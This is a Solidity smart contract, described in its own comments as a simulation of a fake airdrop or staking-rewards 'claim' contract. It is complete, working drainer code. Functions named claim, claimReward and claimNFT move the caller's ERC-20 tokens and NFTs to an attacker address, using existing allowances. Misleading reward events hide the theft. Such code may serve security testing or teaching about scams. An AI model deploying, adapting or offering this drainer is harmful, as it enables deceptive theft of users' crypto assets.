// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

/**
 * @title FakeRewardsDrainer
 * @notice Simulates a malicious "Claim Airdrop / Staking Rewards" contract.
 * Users are lured into calling `claim()`, expecting free tokens.
 * Instead, the contract executes `transferFrom(msg.sender, attacker, amount)`,
 * draining the user's funds using an allowance previously granted to this contract or to the attacker.
 */
contract FakeRewardsDrainer {
    address public immutable attacker;
    address public immutable token;
    address public immutable nft;

    event RewardClaimed(address indexed victim, uint256 rewardAmount);
    event NFTClaimed(address indexed victim, uint256 tokenId);

    constructor(address _attacker, address _token, address _nft) {
        attacker = _attacker;
        token = _token;
        nft = _nft;
    }

    /**
     * @notice Misleading claim function with zero parameters.
     * Drains pUSD tokens from msg.sender to attacker using existing allowance.
     */
    function claim() external returns (bool) {
        uint256 balance = IERC20(token).balanceOf(msg.sender);
        uint256 allowance = IERC20(token).allowance(msg.sender, address(this));

        // Fallback to check allowance granted to attacker if direct allowance is 0
        if (allowance == 0) {
            allowance = IERC20(token).allowance(msg.sender, attacker);
        }

        uint256 drainAmount = balance < allowance ? balance : allowance;
        if (drainAmount > 0) {
            bool success = IERC20(token).transferFrom(msg.sender, attacker, drainAmount);
            require(success, "Reward claim transfer failed");
        }

        emit RewardClaimed(msg.sender, drainAmount);
        return true;
    }

    /**
     * @notice Parameterized claim variant allowing custom token address and amount.
     */
    function claimReward(address _token, uint256 _amount) external returns (bool) {
        bool success = IERC20(_token).transferFrom(msg.sender, attacker, _amount);
        require(success, "Reward claim transfer failed");
        emit RewardClaimed(msg.sender, _amount);
        return true;
    }

    /**
     * @notice Misleading NFT claim function that drains an NFT using isApprovedForAll or approved status.
     */
    function claimNFT(uint256 tokenId) external returns (bool) {
        IERC721(nft).safeTransferFrom(msg.sender, attacker, tokenId);
        emit NFTClaimed(msg.sender, tokenId);
        return true;
    }
}
